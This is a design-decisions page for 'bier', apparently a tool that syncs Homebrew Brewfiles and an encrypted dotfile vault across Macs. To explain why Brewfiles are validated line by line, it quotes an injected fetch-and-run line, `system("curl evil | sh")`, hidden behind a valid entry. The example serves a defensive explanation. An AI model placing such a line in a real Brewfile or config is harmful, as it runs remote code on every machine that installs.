[Docs](../README.md) › Contributing

# Design decisions

Each one has a history. Anyone wanting to overturn one should know why it
is there.

Each one has a history. Anyone wanting to overturn one should know why it
is there.

**No stored diffs.** The difference between two devices is recomputed on
every invocation, never stored. The Brewfile format has no "minus": a
stored diff would no longer be installable, and it would silently change
meaning as soon as `main` grows.

**A delta can only add, never subtract.** Anything a device must
explicitly not run cannot live in `main`. The alternative — an exclusion
list per device — brings a second mechanism with special cases of its
own. `bier take --from-main` solves the same case with what is already
there.

**`bier dump` removes nothing.** Something recorded but not installed
stays. Otherwise you would lose whatever `bier take` has just picked. An
entry really goes away only through `uninstall`, `prune` or a move into
`main`.

**`bier dump` does not adopt what was removed elsewhere.** Otherwise a
dump on the second Mac cements the removal as a device-specific
installation and it is lost. `--adopt` takes it in deliberately.

**The menu bar shows nothing about other devices** — neither a list nor a
count. It says nothing about whether there is anything to do on *this*
Mac, and it does not scale beyond two or three devices. That is what
`bier list` is for.

**`bier sync` asks nothing** and resolves conflicts itself. Nobody
should have to know git commands to keep their Macs in step.

**Only `Brewfiles/` gets committed.** A `git add -A` once hid a source
change under an inventory message.

## Careful with `bier main`

`bier main` rewrites the shared inventory from the Mac it runs on.
Anything that is in there but not installed here drops out for good —
even if another device still has it. The command shows that before
asking:

    Will drop out of main for good, because it is not installed
    on mini — even if another device still has it:
      - cask "font-meslo-lg-nerd-font"

    To keep it, hand it to a device first:
      bier take --from-main

That is why it is a command for the beginning of a setup, not an everyday
tool.

## A Brewfile is Ruby

`brew bundle` does not read a Brewfile, it **evaluates** it. A line that
is not an entry is a program, and it runs on the Mac that installs.

The trap is that `entries` reads only the front of a line:

```
in the file:   brew "wget"; system("curl evil | sh")
bier shows:    brew "wget"
brew runs:     both
```

So the payload rode along behind a valid entry, invisible to `bier
list`, `status`, `diff` and `state`, and `Brewfiles/main` is never
rewritten by everyday commands — `dump` only reads it. It would have sat
there indefinitely and reached every device, and `merge=union` would
have carried it through any conflict.

`verify_brewfile` therefore checks the **whole** line against the
grammar of an entry and refuses the file otherwise. `bier install` and
`bier take` verify before handing anything to `brew`; `bier status`
warns without being asked. Options are allowed by name —
`postinstall` is not among them, because its value is a shell command.

The check refuses rather than filters. Silently dropping the line would
hide exactly the attack it is meant to catch.

## The vault

Three decisions hold it up. Each of them was measured, and each would
look like an arbitrary complication to whoever tries to simplify it.

**The Brewfiles stay readable.** Encrypting them was tried. A union
merge then glues two ciphertexts together, git reports `Auto-merging`
and exits 0, and the file is ruined without a word. And `was_tracked`
searches the history with `git log -S`, which reads the stored blob --
with ciphertext it finds nothing, and "removed elsewhere" stops working.
A transparent clean/smudge filter does not help: git works on what is
stored, not on what the working tree shows.

**The plain files live outside every repository**, in
`~/.barrel/vault`. A `.gitignore` is a rule somebody can get wrong; a
different directory is a fact. Only `Safe/` in the data repository
travels.

**Symmetric, with one passphrase, not a key per Mac.** Public keys would
mean an existing Mac has to re-encrypt for a new one before it can read
anything -- you cannot encrypt to a key you do not have yet. Symmetric
removes that: a new Mac needs the passphrase and nothing else. The price
is one shared secret, and losing a Mac means changing it everywhere.
`age` was the obvious candidate and does not fit: its passphrase mode is
interactive by design and cannot be scripted. gpg in `--batch` mode
with `--passphrase-fd` can, and gnupg is already there.

The passphrase lives in that Mac's own keychain -- a working copy, not a
place to keep it. `security` cannot create iCloud-synchronised items, so
syncing it would need a signed Swift helper, and BierMenu is signed ad
hoc.

**At the destination there is a symlink.** Copying would mean inventing
a semantic bier does not otherwise have for files: does editing
`~/.zshrc` get picked up, or overwritten? With one file the question
does not arise. Five tools were checked for whether writing through a
link keeps it -- vim, `>>`, `sed -i`, python, `cp` -- and all five do.
chezmoi copies because templates have to be rendered first, and we have
no templates.

**A scope is a directory**, `@laptops/dot_zshrc`, so the path says who a
file is for and there is no second list to keep in step. A device name
is a group of one. `.groups` is decrypted before anything else, because
everything after it asks whether it belongs here and `find` gives no
order worth relying on. `vault_seal` never deletes: a Mac legitimately
does not hold the other groups' files.

**Uninstalling puts the real files back first.** Every link points into
the vault, so tidying up without that step leaves a home full of dead
links and no `.zshrc` -- a data loss with advance notice.

`Safe/README-recovery.txt` is unencrypted and says how to get everything
back with `gpg` alone. The passphrase is the one thing nothing can
recover, and `bier vault --init` says so before it takes one.

## Traps that have already sprung

All of them are covered by tests — reintroduce one and you get caught.

- A `trap … RETURN` per function stays armed and fires again when the
  **calling** function returns. The local variable is gone by then and
  `set -u` aborts. Hence one temp directory for the whole run, created at
  startup.
- `entries` without `|| true` returns exit 1 for a file without entries
  and, with `pipefail`, drags every assignment down with it. `bier` dies
  without a word.
- `kind_of` has to look for exact matches in the Brewfiles **first**,
  then ask Homebrew, and check **taps last**: a short name can match a
  tap *and* a cask inside it.
- `was_tracked` may report "removed elsewhere" only when the entry is on
  **no** list any more. Otherwise a package picked up from the other Mac
  counts as a removal.
- Slow output into a pipe (`bier list | head`) produces a broken pipe.
  That is why the overview is collected and printed in one go.
- `prune` has to remove taps **last**: `brew untap` refuses while a cask
  from the tap is still installed.
- After stopping the app, `install.sh` must not guess a second but has to
  wait — otherwise `open` finds the old instance alive and merely
  activates it, and the old code keeps running.
- `bier upgrade` overwrites the running script with the pull, and bash
  reads it in chunks. So `upgrade` hands over to a new process **before**
  the pull, one whose commands live in memory.
- During the split into two repositories `cmd_push` vanished along with
  the function next to it, while its line in the dispatch table stayed.
  No test noticed, because only the read-only commands were exercised.
